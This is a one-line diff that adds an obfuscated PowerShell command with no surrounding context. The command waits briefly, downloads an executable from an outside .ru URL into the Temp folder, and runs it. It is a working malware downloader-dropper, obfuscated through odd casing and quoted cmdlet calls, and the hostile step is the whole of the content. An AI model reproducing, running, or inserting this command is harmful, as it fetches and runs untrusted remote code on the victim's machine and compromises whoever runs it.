@@ -1,0 +1,1 @@
+$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtfoLdeRpATh('Temp');(&'New-Object' 'System.Net.WebClient').dowNLoADFilE.iNVoKE('http://octopus-group.ru/tipo/test.exe','$Des\7364859.exe');&'Start-Process' $Des\7364859.exe
